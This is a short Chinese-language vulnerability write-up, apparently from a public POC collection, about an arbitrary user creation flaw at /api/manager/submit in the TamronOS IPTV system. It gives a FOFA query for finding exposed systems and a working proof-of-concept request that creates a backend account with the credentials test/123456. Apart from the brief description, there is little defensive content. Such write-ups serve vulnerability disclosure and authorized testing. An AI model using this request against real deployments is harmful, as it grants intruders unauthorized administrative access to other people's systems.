# TamronOS-IPTV系统-submit-任意用户创建漏洞

## 漏洞描述

TamronOS IPTV系统 /api/manager/submit 存在任意用户创建漏洞，攻击者通过漏洞可以任意用户创建进入后台

## 漏洞影响

> [!NOTE]
>
> TamronOS IPTV系统

## FOFA

> [!NOTE]
>
> app="TamronOS-IPTV系统"

## 漏洞复现

登录页面如下

![image-20210615145308242](TamronOS-IPTV系统-submit-任意用户创建漏洞.assets/1627363143125626.jpg)

漏洞POC为

```
/api/manager/submit?group=1&username=test&password=123456
```

![image-20210615145547635](TamronOS-IPTV系统-submit-任意用户创建漏洞.assets/1627363143348423.jpg)

```
user: test
pass: 123456
```

![image-20210615145605871](TamronOS-IPTV系统-submit-任意用户创建漏洞.assets/1627363143653307.jpg)